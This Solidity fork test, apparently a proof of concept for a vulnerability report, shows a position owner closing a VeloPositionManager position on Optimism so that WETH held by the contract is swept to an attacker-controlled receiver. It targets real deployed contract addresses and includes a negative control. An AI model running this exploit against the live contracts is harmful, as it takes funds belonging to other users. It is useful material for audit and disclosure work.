// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.20;

import {IVeloVaultPositionManager} from "../src/VeloPositionManager/contracts/interfaces/IVeloVaultPositionManager.sol";
import {IVeloVault} from "../src/VeloPositionManager/contracts/interfaces/IVeloVault.sol";
import {VaultTypes} from "../src/VeloPositionManager/contracts/libraries/types/VaultTypes.sol";

interface Vm {
    function createSelectFork(string calldata urlOrAlias, uint256 blockNumber) external returns (uint256);
    function envString(string calldata name) external returns (string memory);
    function prank(address msgSender) external;
    function label(address account, string calldata newLabel) external;
}

interface IWETH {
    function balanceOf(address account) external view returns (uint256);
    function transfer(address recipient, uint256 amount) external returns (bool);
}

interface IOwnableView {
    function owner() external view returns (address);
}

contract VeloPositionManagerSweepForkTest {
    Vm private constant vm = Vm(address(uint160(uint256(keccak256("hevm cheat code")))));

    address private constant POSITION_MANAGER = 0xf9cFB8a62f50e10AdDE5Aa888B44cF01C5957055;
    address private constant VAULT = 0x236aA1D49dBA7665cB816C943133b53C2241c366;
    address private constant WETH = 0x4200000000000000000000000000000000000006;
    address private constant ATTACKER = 0x10B850C3abFca78d693C9cD6FcE809c129109d1c;
    address private constant RECEIVER = address(0xA11CE);
    // Independent live EOA WETH holder at FORK_BLOCK (103.770096248547036056 WETH).
    address private constant VICTIM = 0x235749Ab451DCD34752bD9e643fCf690e4fA25C4;

    uint256 private constant FORK_BLOCK = 157_500_563;
    uint256 private constant VAULT_ID = 127;
    uint256 private constant POSITION_ID = 9;
    uint256 private constant VICTIM_WETH = 1 ether;

    event log(string message);
    event log_named_address(string key, address value);
    event log_named_uint(string key, uint256 value);

    struct Observation {
        uint256 managerWethBefore;
        uint256 managerWethAfter;
        uint256 receiverEthBefore;
        uint256 receiverEthAfter;
        uint256 receiverGain;
        uint256 victimWethBefore;
        uint256 victimWethAfter;
        uint256 victimContribution;
    }

    function test_attackAndNegativeControl_repeat1() external {
        _repeat("REPEAT_1");
    }

    function test_attackAndNegativeControl_repeat2() external {
        _repeat("REPEAT_2");
    }

    function _repeat(string memory repeatLabel) internal {
        emit log(repeatLabel);

        Observation memory control = _runScenario(false);
        Observation memory attack = _runScenario(true);

        _assertGt(control.receiverGain, 0, "control must produce a legitimate WETH payout A");
        _assertEq(control.managerWethBefore, 0, "control must start with zero manager WETH");
        _assertEq(control.managerWethAfter, 0, "control must finish with zero manager WETH");
        _assertEq(control.receiverGain, control.receiverEthAfter - control.receiverEthBefore, "control gain mismatch");

        _assertEq(attack.managerWethBefore, VICTIM_WETH, "victim WETH was not present before close");
        _assertEq(attack.victimContribution, VICTIM_WETH, "victim provenance mismatch");
        _assertEq(attack.victimWethBefore - attack.victimWethAfter, VICTIM_WETH, "victim balance did not fund B");
        _assertEq(attack.managerWethAfter, 0, "attack must sweep all manager WETH");
        _assertEq(attack.receiverGain, attack.receiverEthAfter - attack.receiverEthBefore, "attack gain mismatch");
        _assertEq(attack.receiverGain, control.receiverGain + VICTIM_WETH, "receiver did not obtain A+B");

        emit log_named_uint("legitimate_payout_A", control.receiverGain);
        emit log_named_uint("victim_balance_B", VICTIM_WETH);
        emit log_named_uint("attack_receiver_gain_A_plus_B", attack.receiverGain);
        emit log_named_uint("attack_excess_over_control", attack.receiverGain - control.receiverGain);
        emit log_named_uint("attack_manager_weth_after", attack.managerWethAfter);
    }

    function _runScenario(bool seedVictimWeth) internal returns (Observation memory obs) {
        vm.createSelectFork(vm.envString("OPTIMISM_RPC_URL"), FORK_BLOCK);
        vm.label(POSITION_MANAGER, "VeloPositionManager");
        vm.label(VAULT, "Vault127");
        vm.label(ATTACKER, "PositionOwnerAttacker");
        vm.label(RECEIVER, "AttackerReceiver");
        vm.label(VICTIM, "IndependentVictim");

        _assertGt(POSITION_MANAGER.code.length, 0, "manager not deployed at pinned block");
        _assertTrue(ATTACKER != IOwnableView(POSITION_MANAGER).owner(), "position owner unexpectedly privileged");

        VaultTypes.VeloPositionValue memory position = IVeloVault(VAULT).getPositionValue(POSITION_ID);
        _assertEqAddress(position.manager, ATTACKER, "fork position manager changed");
        _assertTrue(position.isActive, "fork position is not active");

        _assertEq(IWETH(WETH).balanceOf(POSITION_MANAGER), 0, "pinned manager baseline is not zero");
        if (seedVictimWeth) {
            obs.victimWethBefore = IWETH(WETH).balanceOf(VICTIM);
            _assertGt(obs.victimWethBefore, VICTIM_WETH, "independent holder lacks WETH at pinned block");
            vm.prank(VICTIM);
            _assertTrue(IWETH(WETH).transfer(POSITION_MANAGER, VICTIM_WETH), "victim WETH transfer failed");
            obs.victimWethAfter = IWETH(WETH).balanceOf(VICTIM);
            obs.victimContribution = VICTIM_WETH;
        }

        obs.managerWethBefore = IWETH(WETH).balanceOf(POSITION_MANAGER);
        obs.receiverEthBefore = RECEIVER.balance;

        IVeloVaultPositionManager.CloseVaultPositionPartiallyParams memory params =
            IVeloVaultPositionManager.CloseVaultPositionPartiallyParams({
                vaultId: VAULT_ID,
                vaultPositionId: POSITION_ID,
                percent: 1_000,
                receiver: RECEIVER,
                receiveNativeETH: true,
                receiveType: 0,
                minAmount0WhenRemoveLiquidity: 0,
                minAmount1WhenRemoveLiquidity: 0,
                deadline: block.timestamp + 1 hours,
                swapExecutorId: 0,
                swapPath: bytes("")
            });

        vm.prank(ATTACKER);
        IVeloVaultPositionManager(POSITION_MANAGER).closeVaultPositionPartially(params);

        obs.managerWethAfter = IWETH(WETH).balanceOf(POSITION_MANAGER);
        obs.receiverEthAfter = RECEIVER.balance;
        obs.receiverGain = obs.receiverEthAfter - obs.receiverEthBefore;

        emit log(seedVictimWeth ? "ATTACK_WITH_VICTIM_WETH" : "NEGATIVE_CONTROL_ZERO_MANAGER_WETH");
        emit log_named_address("unprivileged_position_owner", ATTACKER);
        emit log_named_address("attacker_controlled_receiver", RECEIVER);
        emit log_named_uint("manager_weth_before", obs.managerWethBefore);
        emit log_named_uint("independent_holder_weth_before", obs.victimWethBefore);
        emit log_named_uint("independent_holder_weth_after", obs.victimWethAfter);
        emit log_named_uint("receiver_eth_before", obs.receiverEthBefore);
        emit log_named_uint("receiver_eth_after", obs.receiverEthAfter);
        emit log_named_uint("receiver_gain", obs.receiverGain);
        emit log_named_uint("manager_weth_after", obs.managerWethAfter);
    }

    function _assertTrue(bool condition, string memory message) private pure {
        require(condition, message);
    }

    function _assertEq(uint256 left, uint256 right, string memory message) private pure {
        require(left == right, message);
    }

    function _assertEqAddress(address left, address right, string memory message) private pure {
        require(left == right, message);
    }

    function _assertGt(uint256 left, uint256 right, string memory message) private pure {
        require(left > right, message);
    }
}
